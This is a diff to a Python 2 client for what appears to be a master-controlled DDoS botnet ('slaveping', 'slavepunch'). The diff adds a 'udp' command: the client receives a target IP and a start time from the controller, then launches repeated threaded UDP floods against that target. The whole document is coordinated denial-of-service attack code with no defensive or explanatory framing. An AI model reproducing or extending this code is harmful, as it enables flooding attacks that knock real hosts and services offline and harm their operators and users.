@@ -3,13 +3,16 @@ import socket
 import sys
 import datetime
 import time
+import thread
 from slaveping import Ping
 from slavepunch import Punch
+from udpfld import Floodudp
 
 my_address = socket.gethostbyname(socket.gethostname())
 
 ping = 'slaveping'
 punch = 'slavepunch'
+slaveudp = 'udp'
 global ipAdd
 global numPing
 global srcAdd
@@ -34,7 +37,8 @@ try:
 	#send data
 	#message = 'Client Hostname: ' + socket.gethostname()
 	#message = 'slavepunch'
-	message = 'slaveping'
+	#message = 'slaveping'
+	message = 'udp'
 	print >>sys.stderr, '\nSending: "%s"\n' % message 
 	soc.sendall(message)
 	#print >>sys.stderr, '\nSending: "%s"\n' % message 
@@ -55,9 +59,24 @@ try:
 				Ping(ipAdd, count)
 				print >>sys.stderr, 'Complete'
 				break
-	else:
+	elif message == punch:
 		ipAdd = soc.recv(1024)	
 		Punch(srcAdd, ipAdd)
+	elif message == slaveudp:
+		ipAdd = soc.recv(1024)
+		numPing = soc.recv(1024)
+		ping_time_str = soc.recv(1024)		
+		while True:
+			curr_time = datetime.datetime.now()
+			ping_time_time = datetime.datetime(*map(int,ping_time_str.split('-')))
+			if curr_time > ping_time_time:
+				for n in range (100):
+					for x in range (6):
+						thread.start_new_thread(Floodudp, (ipAdd,x))
+						time.sleep(1)
+					time.sleep(1)
+			break
+
 finally:
 	print >>sys.stderr, '\nClosing Socket'
 	soc.close()
